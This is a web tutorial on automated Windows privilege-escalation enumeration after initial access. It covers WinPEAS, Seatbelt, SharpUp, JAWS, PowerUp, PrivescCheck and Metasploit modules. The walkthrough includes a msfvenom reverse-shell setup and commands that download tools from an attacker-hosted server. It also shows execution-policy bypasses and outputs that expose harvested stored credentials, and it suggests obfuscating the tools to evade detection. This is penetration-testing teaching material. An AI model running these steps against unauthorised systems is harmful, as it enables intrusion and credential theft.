<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
<div class="post-content">
            <div class="post-cats">
                <span class="cat-links"><a href="https://www.hackingarticles.in/category/privilege-escalation/" rel="category tag">Privilege Escalation</a></span>            </div>
            <h1 class="post-title entry-title">Window Privilege Escalation: Automated Script</h1>            <div class="post-date">
                                    <div class="entry-meta">
                        <span class="posted-on"><a href="https://www.hackingarticles.in/window-privilege-escalation-automated-script/" rel="bookmark"><time class="entry-date published" datetime="2021-02-28T13:43:51+00:00">February 28, 2021</time><time class="updated" datetime="2025-06-07T07:55:41+00:00">June 7, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
                            </div>

            <div class="content post-excerpt entry-content clearfix">
                <p class="ai-optimize-6 ai-optimize-introduction"><span style="color: #000000;">In this article, we will shed light on some of the automated scripts that can be used to perform Post Exploitation and Enumeration after getting initial accesses to Windows OS based Devices.</span></p>
<h3 class="ai-optimize-7"><span style="color: #800000;">Table of Content</span></h3>
<ul>
<li class="ai-optimize-8"><span style="color: #000000;"><strong>Introduction</strong></span></li>
<li class="ai-optimize-9"><span style="color: #000000;"><strong>Privilege Escalation Vectors</strong></span></li>
<li class="ai-optimize-10"><span style="color: #000000;"><strong>Getting Access on Windows Machine</strong></span></li>
<li class="ai-optimize-11"><span style="color: #000000;"><strong>WinPEAS</strong></span></li>
<li class="ai-optimize-12"><span style="color: #000000;"><strong>Seatbelt</strong></span></li>
<li class="ai-optimize-13"><span style="color: #000000;"><strong>SharpUp</strong></span></li>
<li class="ai-optimize-14"><span style="color: #000000;"><strong>JAWS – Just Another Windows (Enum) Script</strong></span></li>
<li class="ai-optimize-15"><span style="color: #000000;"><strong>PowerUp</strong></span></li>
<li class="ai-optimize-16"><span style="color: #000000;"><strong>Powerless</strong></span></li>
<li class="ai-optimize-17"><span style="color: #000000;"><strong>Metasploit: </strong></span>
<ul>
<li class="ai-optimize-18"><span style="color: #000000;">Windows-Exploit-Suggester</span></li>
<li class="ai-optimize-19"><span style="color: #000000;">Sherlock</span></li>
<li class="ai-optimize-20"><span style="color: #000000;">WinPEAS/SharpUp/Seatbelt</span></li>
</ul>
</li>
<li class="ai-optimize-21"><span style="color: #000000;"><strong>PowerShell Empire: </strong></span>
<ul>
<li class="ai-optimize-22"><span style="color: #000000;">WinPEAS</span></li>
<li class="ai-optimize-23"><span style="color: #000000;">PowerUp</span></li>
<li class="ai-optimize-24"><span style="color: #000000;">Sherlock</span></li>
<li class="ai-optimize-25"><span style="color: #000000;">Watson</span></li>
<li class="ai-optimize-26"><span style="color: #000000;">Privesccheck</span></li>
</ul>
</li>
<li class="ai-optimize-27"><span style="color: #000000;"><strong>Conclusion </strong></span></li>
</ul>
<h3 class="ai-optimize-28"><span style="color: #800000;">Introduction</span></h3>
<p class="ai-optimize-29"><span style="color: #000000;">When an attacker attacks a Windows Operating System most of the time they will get a base shell or meterpreter session. This shell is limited in the actions it can perform. So, in order to elevate privileges, we need to enumerate different files, directories, permissions, logs and SAM files. The number of files inside a Windows OS is very overwhelming. Hence, doing this task manually is very difficult even when you know where to look. So, why not automate this task using scripts.</span></p>
<p class="ai-optimize-30"><span style="color: #000000;">Basically, privilege escalation is a phase that comes after the attacker has compromised the victim’s machine where he tries to gather critical information related to systems such as hidden password and weak configured services or applications and etc. All this information helps the attacker to make the post exploit against the machine for getting the higher-privileged shell.</span></p>
<h3 class="ai-optimize-31"><span style="color: #800000;">Privilege Escalation Vectors</span></h3>
<p class="ai-optimize-32"><span style="color: #000000;">Following information are considered as critical Information of Windows System:</span></p>
<ul>
<li class="ai-optimize-33"><span style="color: #000000;">The version of the operating system</span></li>
<li class="ai-optimize-34"><span style="color: #000000;">Any Vulnerable package installed or running</span></li>
<li class="ai-optimize-35"><span style="color: #000000;">Files and Folders with Full Control or Modify Access</span></li>
<li class="ai-optimize-36"><span style="color: #000000;">Mapped Drives</span></li>
<li class="ai-optimize-37"><span style="color: #000000;">Potentially Interesting Files</span></li>
<li class="ai-optimize-38"><span style="color: #000000;">Unquoted Service Paths</span></li>
<li class="ai-optimize-39"><span style="color: #000000;">Network Information (interfaces, arp, netstat)</span></li>
<li class="ai-optimize-40"><span style="color: #000000;">Firewall Status and Rules</span></li>
<li class="ai-optimize-41"><span style="color: #000000;">Running Processes</span></li>
<li class="ai-optimize-42"><span style="color: #000000;">AlwaysInstallElevated Registry Key Check</span></li>
<li class="ai-optimize-43"><span style="color: #000000;">Stored Credentials</span></li>
<li class="ai-optimize-44"><span style="color: #000000;">DLL Hijacking</span></li>
<li class="ai-optimize-45"><span style="color: #000000;">Scheduled Tasks</span></li>
</ul>
<p class="ai-optimize-46"><span style="color: #000000;">Several scripts are used in penetration testing to quickly identify potential privilege escalation vectors on Windows systems, and today we will elaborate on each script that works smoothly.</span></p>
<h3 class="ai-optimize-47"><span style="color: #800000;">Getting Access on Windows Machine</span></h3>
<p class="ai-optimize-48"><span style="color: #000000;">This step is for maintaining continuity and for beginners. If you are more of an intermediate or expert then you can skip this and get onto the scripts directly. Or if you have got the session through any other exploit then also you can skip this section.</span></p>
<p class="ai-optimize-49"><span style="color: #000000;">We must first exploit the machine because we are discussing post-exploitation or scripts that can be used to list the circumstances or opportunities to escalate privileges. It’s a rather straightforward method. First, we use MSFvenom to create a payload. The windows/x64/shell_reverse_tcp exploit will be employed. We made this decision so that, instead of a meterpreter, we would receive a shell upon execution. Later on, we shall talk about the meterpreter method. We will supply our local IP address and the port on which we anticipate receiving the session in addition to the exploit. We must indicate that the payload is being crafted in an executable format because we are aiming for a Windows computer. After successfully crafting the payload, we run a python one line to host the payload on our port 80. We will use this to download the payload on the target system.</span></p>
<p class="ai-optimize-50"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-VcWMraXzGjg/YDuXhsItbpI/AAAAAAAAuS8/DQLX6Omy8YcHqPtjJccZvhya3mjAzFd8ACLcBGAsYHQ/s16000/1.png"/></span></p>
<p class="ai-optimize-51"><span style="color: #000000;">After downloading the payload on the system, we start a netcat listener on the local port that we mentioned while crafting the payload. Then execute the payload on the target machine. You will get a session on the target machine.</span></p>
<p class="ai-optimize-52"><span style="color: #000000;">Refer to our <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.hackingarticles.in/generating-reverse-shell-using-msfvenom-one-liner-payload/">MSFvenom Article</a> </strong></span>to Learn More.</span></p>
<h3 class="ai-optimize-53"><span style="color: #800000;">WinPEAS</span></h3>
<p class="ai-optimize-54"><span style="color: #000000;"><strong>GitHub Link: <span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/README.md">WinPEAS</a></span></strong></span></p>
<p class="ai-optimize-55"><span style="color: #000000;">Let’s start with WinPEAS. It was created by <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://twitter.com/carlospolopm">Carlos P</a></strong></span>. It was made with a simple objective that is to enumerate all the possible ways or methods to Elevate Privileges on a Windows System. You can download an executable file or a batch file from GitHub. The source code is also available if you are interested in building it on your own. Just make sure to have .Net version 4.5 or above. You could also take the source code and obfuscate it so as to make your activities undetected. All available on <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/winPEAS/winPEASexe/README.md">GitHub</a></strong></span>. One of its features is that the output presented by WinPEAS is full of colours, which makes it easier for the eyes to detect something potentially interesting. The color code details are: Red means that a special privilege is detected, Green is some protection or defence is enabled. Cyan shows the active users on the machine. Blue shows the disabled users and Yellow shows links. There are other colors as well. Each with a different meaning. The WinPEAS is heavily based on Seatbelt. WinPEAS can detect or test the following configurations or locations:</span></p>
<h5 class="ai-optimize-56"><span style="color: #000000;"><strong>System Information</strong></span></h5>
<p class="ai-optimize-57"><span style="color: #000000;">Basic System info information, Use Watson to search for vulnerabilities, Enumerate Microsoft updates, PS, Audit, WEF and LAPS Settings, LSA protection, Credential Guard, WDigest, Number of cached creds, Environment Variables, Internet Settings, Current drives information, AV, Windows Defender, UAC configuration, NTLM Settings, Local Group Policy, AppLocker Configuration &amp; bypass suggestions, Printers, Named Pipes, AMSI Providers, Sysmon, .NET Versions</span></p>
<h5 class="ai-optimize-58"><span style="color: #000000;"><strong>Users Information</strong></span></h5>
<p class="ai-optimize-59"><span style="color: #000000;">Users information, Current token privileges, Clipboard text, Current logged users, RDP sessions, ever logged users, Autologin credentials, Home folders, Password policies, Local User details, Logon Sessions</span></p>
<h5 class="ai-optimize-60"><span style="color: #000000;"><strong>Services Information</strong></span></h5>
<p class="ai-optimize-61"><span style="color: #000000;">Interesting services (non-Microsoft) information, Modifiable services, Writable service registry binpath, PATH Dll Hijacking</span></p>
<h5 class="ai-optimize-62"><span style="color: #000000;"><strong>Applications Information</strong></span></h5>
<p class="ai-optimize-63"><span style="color: #000000;">Current Active Window, Installed software, Autoruns, Scheduled tasks, Device drivers</span></p>
<h5 class="ai-optimize-64"><span style="color: #000000;"><strong>Network Information</strong></span></h5>
<p class="ai-optimize-65"><span style="color: #000000;">Current net shares, Mapped drives (WMI), hosts file, Network Interfaces, Listening ports, Firewall rules, DNS Cache, Internet Settings</span></p>
<h5 class="ai-optimize-66"><span style="color: #000000;"><strong>Windows Credentials</strong></span></h5>
<p class="ai-optimize-67"><span style="color: #000000;">Windows Vault, Credential Manager, Saved RDP settings, recently run commands, Default PS transcripts files, DPAPI Master keys, DPAPI Credential files, Remote Desktop Connection Manager credentials, Kerberos Tickets, Wi-Fi, AppCmd.exe, SSClient.exe, SCCM, Security Package Credentials, AlwaysInstallElevated, WSUS</span></p>
<h5 class="ai-optimize-68"><span style="color: #000000;"><strong>Browser Information</strong></span></h5>
<p class="ai-optimize-69"><span style="color: #000000;">Firefox DBs, Credentials in Firefox history, Chrome DBs, Credentials in chrome history, Current IE tabs, Credentials in IE history, IE Favorites, Extracting saved passwords for: Firefox, Chrome, Opera, Brave</span></p>
<h5 class="ai-optimize-70"><span style="color: #000000;"><strong>Interesting Files and registry</strong></span></h5>
<p class="ai-optimize-71"><span style="color: #000000;">Putty sessions, Putty SSH host keys, Super PuTTY info, Office365 endpoints synced by OneDrive, SSH Keys inside registry, Cloud credentials Check for unattended files, Check for SAM &amp; SYSTEM backups, Check for cached GPP Passwords, Check for and extract creds from MacAfee SiteList.xml files, Possible registries with credentials, Possible credentials files in users homes, Possible password files inside the Recycle bin, Possible files containing credentials, User documents, Oracle SQL Developer config files check, Slack files search, Outlook downloads, Machine and user certificate files, Office most recent documents, Hidden files and folders, Executable files in non-default folders with write permissions, WSL check</span></p>
<h5 class="ai-optimize-72"><span style="color: #000000;"><strong>Events Information</strong></span></h5>
<p class="ai-optimize-73"><span style="color: #000000;">Logon + Explicit Logon Events, Process Creation Events, PowerShell Events, Power On/Off Events</span></p>
<h5 class="ai-optimize-74"><span style="color: #000000;"><strong>Additional Checks</strong></span></h5>
<p class="ai-optimize-75"><span style="color: #000000;">LOLBAS search, run <strong>linpeas.sh</strong> in default WSL distribution.</span></p>
<p class="ai-optimize-76"><span style="color: #000000;">That’s something. I can’t think of any other method or configuration that this tool hasn’t checked. To use it, we will have to download the executable from GitHub. We are using an executable file as we faced some errors with the batch file. We downloaded it into our Kali Linux. Now we host the file using a Python One line.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80</pre>
<p class="ai-optimize-77"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OtRf3a1L75A/YDuXtJxoGnI/AAAAAAAAuTA/p1R6teaGgHY8YrE9iAW1z42e3vcshxL5QCLcBGAsYHQ/s16000/2.png"/></span></p>
<h5 class="ai-optimize-164"><span style="color: #000000;"><strong>Downloading and Executing WinPEAS</strong></span></h5>
<p class="ai-optimize-78"><span style="color: #000000;">We have our shell from the previous Section. Here, we proceeded to create a Temp folder and then used the IWR a.k.a Invoke-Web Request to download WinPEAS to this machine. Then execute it directly from the shell as shown in the image below.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell.exe -command IWR -Uri http://192.168.1.2/winPEAS.exe -OutFile C:\Temp\winPEAS.exe "</pre>
<p class="ai-optimize-79"><span style="color: #000000;"><strong> <img decoding="async" src="https://1.bp.blogspot.com/-bwT1VxCKqPw/YDuXw1hjEEI/AAAAAAAAuTE/o8q8Fvh9MqstFotlTOG6pOhJW6_gF09JwCLcBGAsYHQ/s16000/3.png"/></strong></span></p>
<h5 class="ai-optimize-165"><span style="color: #000000;"><strong>Initial Enumeration Findings</strong></span></h5>
<p class="ai-optimize-80"><span style="color: #000000;">The various tests have begun on the system. We can see WinPEAS enumerating through the Clipboard data. In this age of Password Managers, it is very probable that there are some credentials that are copied by the victim and it just stayed there. This is the recipe for account compromise. Hence always enable 2FA so that you can be protected by such breaches. Moving on to the other results we can see that there are 2 logged users on the target machine. It also checks for the users in the Home Folder and then continues to try and access the Home Folder of other user and then reverts into the result about the level of access on that user. It has successfully extracted the password from the Auto Logon for the user “user”. Then it moves on to read the password policies enabled. It tells us which user has not changed their passwords in a long duration of time and what is the length of the password of that user.</span></p>
<p class="ai-optimize-81"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-rMAGaRTGPJc/YDuX07hplLI/AAAAAAAAuTM/Etj19tN_UhsIfvv_YazVeOG6jgkjOeU5wCLcBGAsYHQ/s16000/4.png"/></span></p>
<p class="ai-optimize-82"><span style="color: #000000;">Then, it moves onto the Network Shares on the target machine. It checks for the network configurations and IP Addresses. Then it checks the local ports for the services as well.</span></p>
<p class="ai-optimize-83"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8aUwzkDxcNE/YDuX6ET9mXI/AAAAAAAAuTQ/0g9u8pDsW14VmAToaBei3Mmg4VQ6RohmACLcBGAsYHQ/s16000/5.png"/></span></p>
<p class="ai-optimize-84"><span style="color: #000000;">It lists a large number of intriguing files and registry variables. It indicates that the password was also taken out of the PuTTY session. If there are any public keys, it can also extract them. SAM is listed for potential qualifications. It listed an encrypted password from an XML file called Unattend.xml, as we can see.</span></p>
<p class="ai-optimize-85"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-_IXkX4N2SR0/YDuX-tAXPPI/AAAAAAAAuTY/Joh4qtpniecsgF8RpDsNH3bxLo_DHecZwCLcBGAsYHQ/s16000/6.png"/></span></p>
<h3 class="ai-optimize-86"><span style="color: #800000;">Seat Belt</span></h3>
<p class="ai-optimize-87"><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/GhostPack/Seatbelt">GitHub Link: Seat Belt</a></span></strong></p>
<p class="ai-optimize-88"><span style="color: #000000;">We just mentioned Seatbelt project when we talked about the WinPEAS. Seatbelt is built in C#. The basic process of enumeration is quite similar to that we just discussed. But it will not provide you with an executable. You will have to build it. Its quite a simple process. We will strongly advise that you build it on your own and not download any pre-existing executable available online. Download the Seatbelt files from GitHub. Just open Visual Studio Community. Choose Open a Project or Solution. Then direct the path for the Seatbelt.sln file. It will load into the Visual Studio. Then click on the Build Menu from the Top Menu bar and then choose Build Solution from the drop-down menu. That’s it. You can check the output window for the location of the binary you just built. At this point, we assume that you have built your executable and you have a session on a Windows Machine. Transfer the executable with your choice of method. Seatbelt provides an insight into the following sections:</span></p>
<h5 class="ai-optimize-166"><span style="color: #000000;"><strong>Building and Transferring Seatbelt</strong></span></h5>
<p class="ai-optimize-89"><span style="color: #000000;">Antivirus, AppLocker Settings,  ARP table and Adapter information, Classic and advanced audit policy settings,  Autorun executables/scripts/programs, Browser(Chrome/Edge/Brave/Opera) Bookmarks, Browser History, AWS/Google/Azure/Bluemix Cloud credential files, All configured Office 365 endpoints which are synchronized by OneDrive, Credential Guard configuration, DNS cache entries, Dot Net versions, DPAPI master keys, Current environment %PATH$ folders, Current environment variables, Explicit Logon events (Event ID 4648) from the security event log, Explorer most recently used files, Recent Explorer “run” commands, FileZilla configuration files, Installed hotfixes, Installed, “Interesting” processes like any defensive products and admin tools, Internet settings including proxy configs and zones configuration, KeePass configuration files, Local Group Policy settings, Non-empty local groups, Local users, whether they’re active/disabled, Logon events (Event ID 4624), Windows logon sessions, Locates Living Off The Land Binaries and Scripts (LOLBAS) on the system and other information.</span></p>
<h5 class="ai-optimize-167"><span style="color: #000000;"><strong>Executing Seatbelt for Enumeration</strong></span></h5>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">impacket-smbserver share $(pwd) -smb2support
copy \\192.168.1.2\share\Seatbelt.exe
Seatbelt.exe -group=all</pre>
<p class="ai-optimize-90"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-ur3nebwX-QA/YDuYFwJsEvI/AAAAAAAAuTg/kyfpDofV4q0EqUsWDQx98bRj5YBij5t5QCLcBGAsYHQ/s16000/8.png"/></span></p>
<p class="ai-optimize-91"><span style="color: #000000;">We can run specific commands and to specific groups. Here, we just executed all the commands using all keyword. It started enumerating all the things that we just told you about.</span></p>
<p class="ai-optimize-92"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SEOWBKHhnno/YDuYNTAISzI/AAAAAAAAuTk/9ZEb57t3cjITyVwOskOKo_cHn2w8dYLXwCLcBGAsYHQ/s16000/9.png"/></span></p>
<p class="ai-optimize-93"><span style="color: #000000;">As clearly visible that when seatbelt enumerated the Auto Logon, it found a set of credentials. It was previously found by WinPEAS as well.</span></p>
<p class="ai-optimize-94"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1at7CDJK-tY/YDuYS88rpSI/AAAAAAAAuTs/8TbQoWrwcqM60RLdQ6_pH3ZS3DhOdXYOwCLcBGAsYHQ/s16000/10.png"/></span></p>
<h3 class="ai-optimize-95"><span style="color: #800000;">SharpUp</span></h3>
<p class="ai-optimize-96"><strong><span style="color: #0000ff;"><a style="color: #0000ff;" href="https://github.com/GhostPack/SharpUp">GitHub Link: SharpUp</a></span></strong></p>
<p class="ai-optimize-97"><span style="color: #000000;">From one C# script to another, we now take a look at the SharpUp script. It was developed by Harmj0y. There is no binary readily available for it as well. But it is possible to build it using a similar process as we did with the Seatbelt. SharpUp imports are various of its functionality from another tool called PowerUp. We will talk in-depth about it later. Again, we will transfer the executable to the target machine using a similar process as we did earlier and run it directly from the terminal. It detects the following:</span></p>
<p class="ai-optimize-98"><span style="color: #000000;">Modifiable Services, Modifiable Binaries, AlwaysInstallElevated Registry Keys, Modifiable Folders in %PATH%, Modifiable Registry Autoruns, Special User Privileges if any and McAfee Sitelist.xml files.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">python -m SimpleHTTPServer 80
powershell.exe iwr -uri 192.168.1.2/SharpUp.exe -o C:\Temp\SharpUp.exe</pre>
<p class="ai-optimize-99"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-6LGTuVNLaJc/YDuYav-fPDI/AAAAAAAAuT0/Fs3OhpTVVqAzHg84QujmzMuDPEAcRq-tQCLcBGAsYHQ/s16000/11.png"/></span></p>
<h3 class="ai-optimize-100"><span style="color: #800000;">JAWS – Just Another Windows (Enum) Script</span></h3>
<p class="ai-optimize-101"><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/411Hall/JAWS">GitHub Link: JAWS</a></strong></span></p>
<p class="ai-optimize-102"><span style="color: #000000;">Surfing through one C# binary to another, we are finally attacked by JAWS. It is a PowerShell script for a change. As it was developed on PowerShell 2.0 it is possible to enumerate Windows 7 as well. It can work and detect the following:</span></p>
<p class="ai-optimize-103"><span style="color: #000000;">Network Information (interfaces, arp, netstat), Firewall Status and Rules, Running Processes, Files and Folders with Full Control or Modify Access, Mapped Drives, Potentially Interesting Files, Unquoted Service Paths, Recent Documents, System Install Files, AlwaysInstallElevated Registry Key Check, Stored Credentials, Installed Applications, Potentially Vulnerable Services, MUICache Files, Scheduled Tasks</span></p>
<p class="ai-optimize-104"><span style="color: #000000;">Since it is a PowerShell script, you might need to make appropriate changes in the Execution Policy to execute it.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell.exe -ExecutionPolicy Bypass -File .\jaws-enum.ps1</pre>
<p class="ai-optimize-105"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AWib5eXaYuI/YDuYongXOcI/AAAAAAAAuT8/9b-PDTmfzpo8VmSJmieSHLhPKJzNQxcSwCLcBGAsYHQ/s16000/12.png"/></span></p>
<p class="ai-optimize-106"><span style="color: #000000;">Here, we can see the various MUICache Files that the JAWS extracted with the Stored credentials as well. It also has enumerated the Auto Logon credentials.</span></p>
<p class="ai-optimize-107"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-nYSjWxwNXGw/YDuYzAOsQHI/AAAAAAAAuUI/ye12UlYMThMef31uPHtzt2qZSYKs8URtACLcBGAsYHQ/s16000/13.png"/></span></p>
<h3 class="ai-optimize-108"><span style="color: #800000;">PowerUp</span></h3>
<p class="ai-optimize-109"><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1">GitHub Link: PowerUp</a></strong></span></p>
<p class="ai-optimize-110"><span style="color: #000000;">PowerUp is another PowerShell script that works on enumerating methods to elevate privileges on Windows System. It has an Invoke-AllChecks option that will represent any identified vulnerabilities with abuse functions as well. It is possible to export the result of the scan using -HTMLREPORT flag.</span></p>
<p class="ai-optimize-111"><span style="color: #000000;">PowerUp detects the following Privileges:</span></p>
<p class="ai-optimize-112"><span style="color: #000000;">Token-Based Abuse, Services Enumeration and Abuse, DLL Hijacking, Registry Checks, etc.</span></p>
<p class="ai-optimize-113"><span style="color: #000000;">In order to use the PowerUp, we need to transfer the script to the Target Machine using any method of your choice. Then bypass the Execution Policy in order to execute the script from PowerShell. Then use the Invoke-AllChecks in order to execute the PowerUp on the target machine. We can see it has already provided us with some Unquoted Path Files that can be used to elevate privilege.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell
powershell -ep bypass
Import-Module .\PowerUp.ps1
Invoke-AllChecks</pre>
<p class="ai-optimize-114"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-qezsUF3a5xI/YDuY55WRyxI/AAAAAAAAuUQ/Sw3omR099fkUbD_9ra7NmVIvT7UsH1RSQCLcBGAsYHQ/s16000/14.png"/></span></p>
<p class="ai-optimize-115"><span style="color: #000000;">It has extracted the credentials for the user using the Autorun Executable. It has also provided the Registry key associated with the user.</span></p>
<p class="ai-optimize-116"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-TZqmZYRvF18/YDuY90oiJHI/AAAAAAAAuUU/LW8jkkuzd9IGE16S7-1jw-FfgKh4ExVsgCLcBGAsYHQ/s16000/15.png"/></span></p>
<h3 class="ai-optimize-117"><span style="color: #800000;">Powerless</span></h3>
<p class="ai-optimize-118"><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/M4ximuss/Powerless">GitHub Link: Powerless</a></strong></span></p>
<p class="ai-optimize-119"><span style="color: #000000;">Many legacy Windows machines have the problem that users cannot access PowerShell and cannot run executable files. But we need to enumerate the possibilities for it as well to elevate privileges. Powerless comes to the rescue here. All you have to do is transfer the batch file to the target machine through the method of your choice and then execute it. It will work and will provide data about the methods and directories that the target machine can use to elevate privileges.</span></p>
<p class="ai-optimize-120"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-OgpwJT6_do4/YDuZDQRtTwI/AAAAAAAAuUc/In7c2pkSiS0fDpNFz_MgkOG92vurmjBfACLcBGAsYHQ/s16000/16.png"/></span></p>
<h3 class="ai-optimize-121"><span style="color: #800000;">Privesccheck</span></h3>
<p class="ai-optimize-122"><span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://github.com/itm4n/PrivescCheck">GitHub Link: Privesccheck</a></strong></span></p>
<p class="ai-optimize-123"><span style="color: #000000;">Another PowerShell script enumerates common Windows configuration issues that can be used for local privilege escalation. It can also serve as a great tool for post-exploitation. During workstation/VDI audits and penetration tests, developers created this application to assist security consultants in locating possible vulnerabilities on Windows computers. They designed it to enumerate rapidly and without the need for any outside tools. There aren’t many dependencies. It is appropriate for usage in settings that mandate application whitelisting, such as AppLocker. Additionally, because admin users can limit it, they do not need the WMI. We move the script file to the destination computer using your preferred manner so that you can utilize it. Next, run it without following the execution policy.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck"</pre>
<p class="ai-optimize-124"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-AfaXMNPdzaA/YDuZKzjxKrI/AAAAAAAAuUg/nfTv9YoTHGcJMzo_bNByzvJvByXO40sBwCLcBGAsYHQ/s16000/17.png"/></span></p>
<p class="ai-optimize-125"><span style="color: #000000;">We can see that it is targeting different services and trying to test if they are vulnerable or not. It is also checking that service with different users, Access Rights. It also checks if the current user is able to access that particular service or not.</span></p>
<p class="ai-optimize-126"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/--ZtGwKygnoM/YDuZPop8LiI/AAAAAAAAuUk/wEa_Sw8bbZIhwBBnEdIU1dq8VTq49lgfwCLcBGAsYHQ/s16000/18.png"/></span></p>
<p class="ai-optimize-127"><span style="color: #000000;">At last, it can generate a report for all the scanning it did. This report sorts the different vulnerabilities based on the risk and indicates whether the application or service is too vulnerable or not.</span></p>
<p class="ai-optimize-128"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-8C9eRNp2Ca4/YDuZViUV3jI/AAAAAAAAuUs/yhPnot5m3_Y9vo3IIu2c0LdFAKVQQTIMACLcBGAsYHQ/s16000/19.png"/></span></p>
<h3 class="ai-optimize-129"><span style="color: #800000;">Metasploit: Windows-Exploit-Suggester</span></h3>
<p class="ai-optimize-130"><span style="color: #000000;">Now that we have different tools and scripts discussed we can turn them over to the Metasploit. There are moments where instead of a base shell you have yourself a meterpreter shell. This is where we can use the in-built post-exploitation module to enumerate various methods to elevate privilege on the target system. </span></p>
<p class="ai-optimize-131"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-X6_mlmaHhHM/YDuZaIzGtHI/AAAAAAAAuU0/GfS0KFTEU9sH-coMIdcARAJ_lgINetQogCLcBGAsYHQ/s16000/25.png"/></span></p>
<h3 class="ai-optimize-132"><span style="color: #800000;">Metasploit: Sherlock</span></h3>
<p class="ai-optimize-133"><span style="color: #000000;">Sherlock is one of the oldest scripts that were so extensively used that Metasploit decided to include it in its post-exploitation framework. It requires PowerShell. When you do have the meterpreter on the target machine, use the load powershell command to get the PowerShell properties on that particular shell. Then use the import function to run the Sherlock on that meterpreter session. It will run and scan the target machine for vulnerabilities and return the ones that are most probable to work to elevate privileges. It will return CVE details of the exploits as well.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">load powershell
powershell_import /root/Sherlock.ps1
powershell_execute "find-allvulns"</pre>
<p class="ai-optimize-134"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-1ysUIj5qgFo/YDuZfW9mDsI/AAAAAAAAuU8/PjF9RXkGUNQBtHaJYXZQsvE60Zks8cGAwCLcBGAsYHQ/s16000/26.png"/></span></p>
<h3 class="ai-optimize-135"><span style="color: #800000;">Metasploit: WinPEAS/SharpUp/Seatbelt</span></h3>
<p class="ai-optimize-136"><span style="color: #000000;">In the scenario, where you have the meterpreter on the target machine and you want to run the best tools such as Seatbelt or SharpUp or WinPEAS, you can do that by following this procedure. We will create a directory. Then use the upload command to transfer the induvial script or executables. Then just pop the cmd using the shell command. This will enable you to execute the executables or scripts directly on the system.</span></p>
<pre class="EnlighterJSRAW" data-enlighter-language="generic">mkdir privs
cd privs
upload /root/Downloads/Seatbelt.exe
upload /root/Downloads/SharpUp.exe
upload /root/Downloads/WinPEAS.exe
shell
WinPEAS.exe
SharpUp.exe
Seatbelt.exe</pre>
<p class="ai-optimize-137"><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-jTYQL2sAuE0/YDuZjhGHuJI/AAAAAAAAuVA/ENCjJayIN3keKX5xsN8lx-qvqbVxWS2MQCLcBGAsYHQ/s16000/27.png"/></span></p>
